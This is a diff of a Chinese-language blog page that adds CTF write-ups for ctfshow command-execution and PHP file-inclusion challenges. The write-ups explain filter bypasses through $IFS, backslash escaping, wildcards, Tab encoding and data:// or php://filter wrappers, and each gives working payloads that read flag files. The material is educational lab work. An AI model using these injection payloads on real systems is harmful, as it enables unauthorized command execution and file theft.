@@ -74,7 +74,7 @@
     <article id="post-hello-world" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2026/08/12/hello-world/" class="article-date">
-  <time class="dt-published" datetime="2026-08-12T05:39:54.625Z" itemprop="datePublished">2026-08-12</time>
+  <time class="dt-published" datetime="2026-08-12T08:15:42.654Z" itemprop="datePublished">2026-08-12</time>
 </a>
     
   </div>
@@ -110,7 +110,434 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://l-y-f-f1111.github.io/2026/08/12/hello-world/" data-id="cmspsu9v90000h4uycm60ee67" data-title="Hello World" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      <a data-url="https://l-y-f-f1111.github.io/2026/08/12/hello-world/" data-id="cmspupgt6000a1cuye3382l66" data-title="Hello World" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2026-08-11-ctfshow 命令执行web52" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/08/11/2026-08-11-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb52/" class="article-date">
+  <time class="dt-published" datetime="2026-08-11T00:00:00.000Z" itemprop="datePublished">2026-08-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/08/11/2026-08-11-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb52/">ctfshow 命令执行web52</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>题目来源：ctfshow 命令执行web52<br>题目链接(<a target="_blank" rel="noopener" href="https://b83d7aae-37e0-4319-bc65-1d82018700c8.challenge.ctf.show/">https://b83d7aae-37e0-4319-bc65-1d82018700c8.challenge.ctf.show/</a>)<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260810183116.png"><br>正则过滤了分号 cat flag 空格 所有数字 <code>$</code> <code>*</code> more less head sort tail sed cut tac awk strings od curl 反引号 <code>%</code> Tab键 <code>&amp;</code> <code>&lt;</code> <code>&gt;</code>且不区分大小写<br>重定向被禁 换用<br><code>?c=ta\c$IFSfla\g.php||</code><br><img src="/images/Pastedimage20260810184031.png"><br>得不到flag 原因是：shell解析过程中变量名是 <code>$IFSfla</code>，而不是 <code>$IFS</code>,Shell 会查找名为 <code>IFSfla</code> 的变量，但这个变量不存在 <code>$IFSfla</code> 被替换为空字符串<br>（一般情况下是<code>$IFS$9</code> <code>$9</code>作为边界，但是这里<code>$</code>和9都被禁止了所以用反斜杠<code>\</code>)</p>
+<p>payload:<code>?c=ta\c$IFS\fla\g.php||</code><br>反斜杠可以做边界的原因：在Shell中，变量名由字母、数字、下划线组成 这里的反斜杠不符合该要求，所以区分开了变量名<br><img src="/images/Pastedimage20260810184130.png%7C697"><br>提示flag不在该文件中 真正的flag可能在：根目录下的文件<br>payload:<code>?c=ta\c$IFS\/fla\g||</code><br><img src="/images/Pastedimage20260810185226.png"><br>得到flag</p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>题目来源：ctfshow 命令执行web53<br>题目链接(<a target="_blank" rel="noopener" href="https://52fb4478-1f2e-45c3-90f7-ab16360b6cef.challenge.ctf.show/">https://52fb4478-1f2e-45c3-90f7-ab16360b6cef.challenge.ctf.show/</a>)<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260810185825.png"><br>正则过滤了分号 cat flag 空格 所有数字  <code>*</code> more less head sort tail sed cut tac awk strings od curl 反引号 <code>%</code> Tab键 <code>&amp;</code> <code>&lt;</code> <code>&gt;</code>且不区分大小写<br>如果通过正则检测，执行系统命令 <code>$c</code>，并将命令的最后一行输出赋值给变量 <code>$d</code><br>输出一个HTML换行标签 <code>&lt;br&gt;</code>，然后输出 <code>$d</code> 的值<br>总体实现了：命令输出直接显示在浏览器，额外显示命令的最后一行，且没有重定向，可以省去命令分割<br>用上一题的绕过空格的方法<br>payload:<code>?c=ta\c$IFS\fla\g.php</code><br><img src="/images/Pastedimage20260810191320.png"><br>得到flag</p>
+<p>还有另外一种格式：<br>由于此题<code>$</code>没有被禁，所以空格可以用<code>$&#123;IFS&#125;</code>代替，这个格式直接确定好了边界，无需再加反斜杠<br><code>?c=ta\c$&#123;IFS&#125;fla?.php</code><br><img src="/images/Pastedimage20260810191425.png"><br>得到flag</p>
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>题目来源：ctfshow 文件包含web79<br>题目链接(<a target="_blank" rel="noopener" href="https://f73c96f3-2aa6-4f22-bd63-1153f9fb8e5e.challenge.ctf.show/">https://f73c96f3-2aa6-4f22-bd63-1153f9fb8e5e.challenge.ctf.show/</a>)<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260811190501.png"><br>GET传参赋值给参数<code>file</code><br><code>$file = str_replace(&quot;php&quot;, &quot;???&quot;, $file);</code><br>第1个参数：要查找的字符串 <code>&quot;php&quot;</code><br>第2个参数：替换成的内容 <code>&quot;???&quot;</code><br>第3个参数：目标字符串 <code>$file</code><br>执行过程：查找<code>$file</code>中所有出现的<code>&quot;php&quot;</code>，替换为<code>&quot;???&quot;</code><br><code>include()</code>：PHP的文件包含函数，将指定文件的内容作为PHP代码执行<br>和上一题一样用data协议查看文件目录 但是为了避免<code>php</code>触发替换字符的命令 要对包含PHP代码的完整语句进行Base64编码<br>Base64编码后的字符串不包含连续的”php” <code>str_replace</code>无法匹配到”php”<br>数据在解码后才是PHP代码，<code>str_replace</code>发生在include之前，替换时处理的是编码后的字符串，解码在include内部进行<br>总结绕过原理：<strong>str_replace先执行，include后执行 并且include时才解码</strong><br><img src="/images/Pastedimage20260811192103.png"><br>payload:<code>/?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdscycpOw==</code><br><img src="/images/Pastedimage20260811191814.png"></p>
+<p>查看flag.php文件内容<br><img src="/images/Pastedimage20260811192036.png"><br><code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCdjYXQgZmxhZy5waHAnKTs=</code><br><img src="/images/Pastedimage20260811192149.png"><br>查看源码拿到flag<br><img src="/images/Pastedimage20260811194959.png"></p>
+<p>查看wp后发现可以直接通过大小写绕过<br>我根据这个思路 用了上一题的payload把php进行了大小写修改<br>payload:<code>?file=Php://filter/read=convert.base64-encode/resource=flag.Php</code><br>得不到flag<br><img src="/images/Pastedimage20260811192645.png"><br>原因：<strong>协议名称在流包装器注册表中是区分大小写的</strong><br>所以不能用<code>php://filter</code><br>改为使用<code>data://</code> +大小写绕过<br><code>?file=data://text/plain,&lt;?Php system(&#39;tac fla*&#39;);?&gt;</code><br><img src="/images/Pastedimage20260811193349.png"><br>得到flag</p>
+<p>这里我发现了昨天那道文件包含题的问题，昨天做的时候查看源码没有响应，我今天又试了一下发现可以拿到flag<br><code>?file=data://text/plain,&lt;?php system(&#39;cat flag.php&#39;);</code><br>查看源码同样可以得到flag<br><img src="/images/Pastedimage20260811195649.png"><br>这个payload是在执行命令，而不是在读取文件内容<br>1.PHP接收到请求<br>2.PHP解析data:&#x2F;&#x2F;协议<br>3.PHP执行包含的代码<br>&#x2F;&#x2F; 执行流程：<br>&#x2F;&#x2F; 1. 解析 <code>&lt;?php ... ?&gt; </code>标签<br>&#x2F;&#x2F; 2. 执行 <code>system(&#39;cat flag.php&#39;)</code><br>&#x2F;&#x2F; 3. 返回命令结果<br>4.系统命令cat在服务器端的Shell中执行 system() 函数执行的内容cat flag.php</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://l-y-f-f1111.github.io/2026/08/11/2026-08-11-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb52/" data-id="cmspupgt600091cuyd6gz9xoc" data-title="ctfshow 命令执行web52" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2026-08-10-ctfshow 命令执行web50" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/08/10/2026-08-10-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb50/" class="article-date">
+  <time class="dt-published" datetime="2026-08-10T00:00:00.000Z" itemprop="datePublished">2026-08-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/08/10/2026-08-10-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb50/">ctfshow 命令执行web50</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>题目来源：ctfshow 命令执行web50<br>题目链接(<a target="_blank" rel="noopener" href="https://9c8c9aee-bc98-4809-b7e8-400c9e73cb86.challenge.ctf.show/">9c8c9aee-bc98-4809-b7e8-400c9e73cb86.challenge.ctf.show</a>)<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260809192354.png"><br><code>\x09</code> 是十六进制表示法，代表ASCII码为09的字符 ASCII 09&#x3D;Tab<br><code>\x26</code> 是十六进制表示法，代表ASCII码为26的字符 ASCII 26&#x3D;<code>&amp;</code> <br>正则过滤绕过了分号 cat flag 空格 所有数字 <code>$</code> <code>*</code> more less head sort tail sed cut awk strings od curl 反引号 <code>%</code> Tab键 <code>&amp;</code><br>绕过了Tab键要想其他方法绕过对空格的过滤<br><code>?c=tac&lt;fla\g.php||</code><br><img src="/images/Pastedimage20260809193824.png"><br>拿到flag</p>
+<p>查看wp时发现另外一种payload:<code>?c=nl&lt;fla\g.php||</code><br>nl是一个Linux&#x2F;Unix系统中的文本处理命令，给文本文件的每一行添加行号，然后输出到标准输出<br><img src="/images/Pastedimage20260809194353.png"><br>得不到flag<br>在Linux&#x2F;Unix中，每个命令执行完毕后都会返回一个退出状态码<br>0&#x3D;命令执行成功  非0(1-255) 命令执行失败或有错误<br>返回1，说明<code>nl</code> 失败 原因可能是文件格式问题 文件中包含特殊字符 <code>nl</code> 无法处理某些情况<br>这里可以看出多数情况下还是使用<code>tac</code>比较稳妥</p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>题目来源：ctfshow 命令执行web51<br>题目链接(<a target="_blank" rel="noopener" href="https://3b77c9ae-7e09-4158-86b7-3c00cbc44e07.challenge.ctf.show/">3b77c9ae-7e09-4158-86b7-3c00cbc44e07.challenge.ctf.show</a>)<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260809200805.png"><br>正则过滤了分号 cat flag 空格 所有数字 <code>$</code> <code>*</code> more less head sort tail sed cut tac awk strings od curl 反引号 <code>%</code> Tab键 <code>&amp;</code><br>这里多过滤了tac<br>同样先尝试一下nl  payload:<code>?c=nl&lt;fla\g.php||</code><br><img src="/images/Pastedimage20260809203612.png"><br>得不到flag<br>用反斜杠绕过<code>?c=ta\c&lt;fla\g.php||</code><br><img src="/images/Pastedimage20260809201031.png"><br>1.正则层面：<code>ta\c</code> 不是 <code>tac</code>，<code>fla\g</code> 不是 <code>flag</code>，绕过了黑名单<br>2.反斜杠转义后，<code>ta\c</code> → <code>tac</code>，<code>fla\g</code> → <code>flag</code><br>3.<code>tac</code> 成功执行，不触发 <code>||</code> 后面的重定向</p>
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>题目来源：ctfshow 文件包含web78<br>题目链接(<a target="_blank" rel="noopener" href="https://7c57845b-59d2-4bed-b3fa-fc7b6167f33c.challenge.ctf.show/">https://7c57845b-59d2-4bed-b3fa-fc7b6167f33c.challenge.ctf.show/</a>)<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260810164539.png"><br>GET传参赋值给参数<code>file</code>并且没有过滤要求，<code>include()</code> 函数会包含并执行指定的文件<br><strong>注意</strong>：<code>include()</code> 可以包含任何可解析为PHP代码的内容，不仅仅是文件，还包括数据流、远程内容等<br>所以这里可以使用php伪协议<br><code>?file=data://text/plain,&lt;?php system(&#39;ls&#39;);?&gt;</code><br>执行流程如下：<br>1.PHP解析URL，识别出<code>data://</code>协议<br>2.从<code>data://text/plain,</code>后面提取数据：<code>&lt;?php system(&#39;ls&#39;);?&gt;</code><br>3 将这段数据当作PHP代码编译并执行<br>4.<code>system(&#39;ls&#39;)</code> 被调用，列出当前目录文件<br>5 输出结果被返回给浏览器<br><img src="/images/Pastedimage20260810165026.png"><br>发现flag.php</p>
+<p>直接包含该文件尝试一下payload:<code>?file=flag.php</code><br><img src="/images/Pastedimage20260810173328.png"><br>没有响应 猜测是因为文件中没有输出flag的语句<br>（后面证实了文件只定义了变量 <code>$flag</code>，但没有输出它）</p>
+<p>payload:<code>?file=data://text/plain,&lt;?php system(&#39;cat flag.php&#39;); ?&gt;</code><br><img src="/images/Pastedimage20260810180003.png"><br>得不到flag<br>原因是读取PHP文件时，不要直接输出原始内容，因为 <code>&lt;?php</code> 标签可能被二次解析导致白屏。必须使用 Base64 或其他编码方式</p>
+<p>所以改为使用<code>php://filter</code>协议+base64 PHP读取源码且无需执行<br>payload:<code>?file=php://filter/read=convert.base64-encode/resource=flag.php</code><br>执行流程如下：<br>1.PHP解析URL，识别出 php:&#x2F;&#x2F;filter 协议<br>2.解析过滤器参数：read&#x3D;convert.base64-encode 表示读取时应用base64编码过滤器，resource&#x3D;flag.php 指定要操作的目标文件<br>3 php:&#x2F;&#x2F;filter 协议打开 resource 参数指定的文件 flag.php<br>4.读取 flag.php 文件的原始内容<br>5.将读取到的原始内容传递给 convert.base64-encode 过滤器<br>6 过滤器对内容进行base64编码处理，将 PHP 代码转换为纯文本字符串<br>7.php:&#x2F;&#x2F;filter 将编码后的内容返回给 include() 函数<br>8 include() 接收到的是 base64 编码的纯文本字符串，不是有效的 PHP 代码，所以不会执行其中的语句<br>9.include() 直接将编码后的字符串输出到响应体<br>10.浏览器收到并显示 base64 编码字符串<br><img src="/images/Pastedimage20260810165115.png"><br>base64解码<br><img src="/images/Pastedimage20260810165205.png"><br>得到flag</p>
+<p>两个伪协议的区别<br><code>data://</code>&#x3D;自带数据的”执行型”协议（注入代码并执行）例如这个题中的查看文件目录<br>结构：<code>data://&lt;MIME类型&gt;,&lt;原始数据内容&gt;</code><br><code>php://filter=</code>处理文件的”读取型”协议（读取并转换内容）例如这个题中的读取文件内容<br>结构：<code>php://filter/[操作类型]=[过滤器名称]/resource=[目标文件]</code></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://l-y-f-f1111.github.io/2026/08/10/2026-08-10-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb50/" data-id="cmspupgt500081cuyd9roe2gj" data-title="ctfshow 命令执行web50" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2026-08-09-ctfshow 命令执行web47" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/08/09/2026-08-09-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb47/" class="article-date">
+  <time class="dt-published" datetime="2026-08-09T00:00:00.000Z" itemprop="datePublished">2026-08-09</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/08/09/2026-08-09-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb47/">ctfshow 命令执行web47</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>题目来源：ctfshow 命令执行web47<br>题目链接(<a target="_blank" rel="noopener" href="https://21f10300-f520-4fa1-8b03-8df41f18872a.challenge.ctf.show/">https://21f10300-f520-4fa1-8b03-8df41f18872a.challenge.ctf.show/</a>)<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260808174411.png"><br>正则过滤了<code>;</code> cat flag 空格 所有数字 <code>$</code> <code>*</code>  more less head sort tail<br>和上一题相比多过滤了more&#x2F;less&#x2F;head&#x2F;sort&#x2F;tail 这些是 Linux系统中的文本查看和处理命令<br><code>more</code> 是Linux中最基础的分页查看器，用于逐页浏览文件内容，适合查看大文件。<br><code>less</code> 是 <code>more</code> 的增强版本，功能更强大，是双向分页查看器<br><code>head</code>查看文件头部<br><code>sort</code>对文件内容进行排序并显示<br><code>tail</code>查看文件尾部</p>
+<p>依旧用tac绕过<br>所以payload:<code>?c=tac%09fla?.php||</code><br><img src="/images/Pastedimage20260808175436.png"><br>得到flag<br>这里我先尝试了<code>?c=tac%09fla?||</code>,因为web45我尝试空格替代方法的时候省去了<code>.php</code>,但是这题省略之后得不到flag，猜测是有多个fla开头的文件影响了输出。</p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>题目来源：ctfshow 命令执行web48<br>题目链接(<a target="_blank" rel="noopener" href="https://301b49d5-091f-4ec5-bf2d-27f5adb12fca.challenge.ctf.show/">https://301b49d5-091f-4ec5-bf2d-27f5adb12fca.challenge.ctf.show/</a>)<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260808180011.png"><br>正则过滤了分号 cat flag 空格 所有数字 <code>$</code> <code>*</code> more less head sort tail sed cut awk string od curl 反引号<br>这里<code>more, less, head, sort, tail, sed, cut, awk, strings, od</code>是查看命令<br>反引号是禁止命令替换 反引号会先执行其中的命令，然后将执行结果替换到原来的位置<br><code>sed</code>功能强大的文本处理工具，可以查找、替换、删除文本<br><code>cut</code>剪切文本,从每行中提取特定部分<br><code>awk</code>强大的文本分析工具，可以按列处理数据<br><code>strings</code>从二进制文件中提取所有可打印的字符串<br><code>od</code>以八进制、十六进制等格式显示文件内容<br><code>curl</code> 是一个网络传输工具，支持多种协议（HTTP、HTTPS、FTP、SFTP、SMTP等），用于在命令行下发送和接收网络请求<br>还是用<code>tac</code>绕过<br>payload:<code>?c=tac%09fla?.php||</code><br><img src="/images/Pastedimage20260808182133.png"><br>得到flag</p>
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>题目来源：ctfshow 命令执行web49<br>题目链接(<a target="_blank" rel="noopener" href="https://d4d8f0d1-e0f1-409c-870f-236dbca1eaef.challenge.ctf.show/">https://d4d8f0d1-e0f1-409c-870f-236dbca1eaef.challenge.ctf.show/</a>)<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260808182704.png"><br>正则过滤了分号 cat flag 空格 所有数字 <code>$</code> <code>*</code> more less head sort tail sed cut awk strings od curl 反引号 <code>%</code><br>尝试用<code>&lt;</code></p>
+<p>payload:<code>?c=tac&lt;fla?.php||</code><br>这里还是同样的问题 通配符搭配重定向符号使用时，可能会遇到重定向匹配多个文件，这时会影响输出<br><img src="/images/Pastedimage20260808183632.png"></p>
+<p>payload:<code>?c=tac&lt;fla\g.php||</code><br><code>fla\g.php</code> 中的序列是：<code>f</code>→<code>l</code>→<code>a</code>→<code>\</code>→<code>g</code> ，<code>a</code> 后面是 <code>\</code>，不是 <code>g</code> 所以绕过对flag的过滤<br>并且fla\g.php <code>\g</code> 被Shell转义，在Shell中，<code>\g</code>表示字符 g 本身<br><img src="/images/Pastedimage20260808185246.png"><br>得到flag</p>
+<p><strong>注意</strong><br>查看wp时发现 payload:<code>?c=tac%09fla?.php||</code>仍然适用<br><img src="/images/Pastedimage20260808185723.png"><br>原因：URL解码发生在正则过滤之前<br>URL解码之后%09被转为了tab键 绕过了对空格以及百分号的过滤</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://l-y-f-f1111.github.io/2026/08/09/2026-08-09-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb47/" data-id="cmspupgt500071cuy13ooc4oo" data-title="ctfshow 命令执行web47" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2026-08-07-ctfshow 命令执行web44" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/08/07/2026-08-07-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb44/" class="article-date">
+  <time class="dt-published" datetime="2026-08-07T00:00:00.000Z" itemprop="datePublished">2026-08-07</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/08/07/2026-08-07-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb44/">ctfshow 命令执行web44</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>题目来源：ctfshow 命令执行web44<br>题目链接(<a target="_blank" rel="noopener" href="https://0afa236f-cafc-4f6a-9a06-49a1c6b001b1.challenge.ctf.show/">https://0afa236f-cafc-4f6a-9a06-49a1c6b001b1.challenge.ctf.show/</a>)<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260807101715.png"><br>正则过滤了分号和flag以及cat不区分大小写<br>和前两题思路相同，通过分隔命令使重定向只针对空命令而不影响查看flag的命令<br>但是这里多过滤了flag<br>因为：<code>system()</code> 通过shell执行命令，通配符由shell展开，并且过滤检查在shell展开之前，所以通配符可以有效绕过关键词过滤<br>payload:<code>?c=tac fl*.php%26%26 </code><br><img src="/images/Pastedimage20260807100947.png"><br>payload:<code>?c=tac fl*.php||</code><br><img src="/images/Pastedimage20260807100427.png"></p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>题目来源：ctfshow 命令执行web45<br>题目链接(<a target="_blank" rel="noopener" href="https://9f765acb-203a-4235-b966-42ad1009c6d2.challenge.ctf.show/">9f765acb-203a-4235-b966-42ad1009c6d2.challenge.ctf.show</a>)<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260807102410.png"><br>通过正则过滤了cat flag 分号和空格<br>和上一题相比多过滤了空格 通过tab键url编码%09即可绕过<br>payload:<code>?c=tac%09fl*.php||</code><br><img src="/images/Pastedimage20260807111137.png"><br>得到flag<br>补充其他过滤空格的方法：<br>换行符%0a 回车符%0d 垂直制表符%0b 换页符%0c 输入重定向&lt; 花括号扩展{,} $IFS$9<br>输入重定向&lt; 花括号扩展{,} $IFS$9都在shell解析层起作用</p>
+<table>
+<thead>
+<tr>
+<th></th>
+<th></th>
+<th></th>
+</tr>
+</thead>
+<tbody><tr>
+<td>第 1 层</td>
+<td><strong>Web 应用层</strong>（PHP）</td>
+<td>接收 <code>$_GET[&#39;c&#39;]</code>，执行正则过滤，调用 <code>system()</code></td>
+</tr>
+<tr>
+<td>第 2 层</td>
+<td><strong>Shell 解析层</strong>（Bash&#x2F;Sh）</td>
+<td>对 <code>system()</code> 传入的字符串进行解析：变量展开、通配符展开、分词、重定向</td>
+</tr>
+<tr>
+<td>第 3 层</td>
+<td><strong>操作系统执行层</strong>（Kernel）</td>
+<td>真正执行 <code>tac</code> 进程，读取文件</td>
+</tr>
+</tbody></table>
+<h1 id="1"><a href="#1" class="headerlink" title="1"></a>1</h1><p><code>?c=tac$IFS$9fla*||</code><br><img src="/images/Pastedimage20260807111213.png"><br>得到flag 原因：<br><code>$9</code> 是Shell的第9个位置参数 正常执行时<code>$9</code> 通常是空的<br>${IFS}是Shell的分隔符集合<br>默认情况下，IFS 包含三个字符：空格 制表符 换行符<br>所以<code>$IFS$9</code> 相当于 <code>$&#123;IFS&#125;</code> + 空字符串<br>即空格 + 空字符串 最终产生一个空格<br>加<code>$9</code>的原因：Shell在解析变量时有一个“最长匹配”原则，所以加上<code>$9</code>作为边界标记，明确告诉Shell变量 <code>IFS</code> 到这里就结束了，后面是其他内容，这样更安全</p>
+<h1 id="2"><a href="#2" class="headerlink" title="2"></a>2</h1><p><code>?c=tac&lt;fla*||</code><br><img src="/images/Pastedimage20260807104822.png"><br>得不到flag的原因：<br>重定向<code>&lt;</code> 本身是可以代替空格的，但是如果通配符匹配多个文件，<code>&lt;</code> 会报错（重定向模糊）</p>
+<h1 id="3"><a href="#3" class="headerlink" title="3"></a>3</h1><p><code>?c=tac&#123;,&#125;fla*||</code><br><img src="/images/Pastedimage20260807105329.png"><br>得不到flag的原因<br>花括号扩展符 <code>&#123;,&#125;</code> 产生空格不是通用的方法，shell可能不支持</p>
+<h1 id="web3"><a href="#web3" class="headerlink" title="web3"></a>web3</h1><p>题目来源：ctfshow 命令执行web46<br>题目链接(<a target="_blank" rel="noopener" href="https://41c86744-5fd8-4b46-b1e6-864740a9ee7f.challenge.ctf.show/">https://41c86744-5fd8-4b46-b1e6-864740a9ee7f.challenge.ctf.show/</a>)<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260807111525.png"><br>正则过滤了flag cat 所有数字 空格 分号  美元符号 星号<br><strong>通配符</strong><br><code>*</code>匹配任意长度字符<br><code>?</code>匹配一个字符<br><code>[]</code>匹配方括号里的任意一个字符<br><code>[!]</code>匹配不在方括号里的任意一个字符<br><code>[ -]</code>匹配范围内的一个字符<br>所以使用除<code>*</code>外的通配符绕过<br>payload:<code>/?c=tac%09fla?.php||</code><br><img src="/images/Pastedimage20260807103546.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://l-y-f-f1111.github.io/2026/08/07/2026-08-07-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb44/" data-id="cmspupgt400041cuycg35gnup" data-title="ctfshow 命令执行web44" class="article-share-link"><span class="fa fa-share">分享</span></a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-2026-08-06-ctfshow 命令执行web42" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2026/08/06/2026-08-06-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb42/" class="article-date">
+  <time class="dt-published" datetime="2026-08-06T00:00:00.000Z" itemprop="datePublished">2026-08-06</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2026/08/06/2026-08-06-ctfshow%20%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8Cweb42/">ctfshow 命令执行web42</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>题目来源：ctfshow 命令执行web42<br>题目链接(<a target="_blank" rel="noopener" href="https://0afa236f-cafc-4f6a-9a06-49a1c6b001b1.challenge.ctf.show/">https://0afa236f-cafc-4f6a-9a06-49a1c6b001b1.challenge.ctf.show/</a>)<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260805204058.png"><br>GET传参传入参数c<br>通过<code>system()</code>函数执行系统命令<br>重定向符号 <code>&gt;</code> 所有输出被重定向到<code>/dev/null</code>（<code>&gt;/dev/null 2&gt;&amp;1</code>）<br><code>/dev/null</code> 是Linux&#x2F;Unix系统中的<strong>特殊设备文件</strong>，常被称为”<strong>黑洞</strong>“或”<strong>空设备</strong>“<br>没有正则过滤 但是输出被完全屏蔽了<br>payload:<code>?c=tac flag.php;</code><br>即命令为：<code>system($c.&quot; &gt;/dev/null 2&gt;&amp;1&quot;);</code><br>当传入 <code>c=tac flag.php;</code> 时，实际执行的命令是<code>tac flag.php; &gt;/dev/null 2&gt;&amp;1</code><br>分号 <code>;</code> 在shell中表示命令分隔符 它让命令变成两条独立的命令<br>第一条命令<code>tac flag.php</code><br>第二条命令<code>&gt; /dev/null 2&gt;&amp;1</code>空命令+重定向<br><strong>重点</strong>：<code>&gt;/dev/null 2&gt;&amp;1</code> 只对紧挨着它的命令或最后一条命令生效<br>所以<code>tac flag.php</code> 的输出不会被重定向 只有 <code>&gt;/dev/null 2&gt;&amp;1</code> 这条空命令被重定向<br><img src="/images/Pastedimage20260805204338.png"></p>
+<h1 id="web2"><a href="#web2" class="headerlink" title="web2"></a>web2</h1><p>题目来源：ctfshow 命令执行web43<br>题目链接(<a target="_blank" rel="noopener" href="https://0afa236f-cafc-4f6a-9a06-49a1c6b001b1.challenge.ctf.show/">https://0afa236f-cafc-4f6a-9a06-49a1c6b001b1.challenge.ctf.show/</a>)<br>题目描述：<br>解题思路：<br>启动靶机<br><img src="/images/Pastedimage20260805212836.png"><br>正则过滤了分号和cat 并且输出仍然被重定向到 <code>/dev/null</code><br>找其他命令分隔符</p>
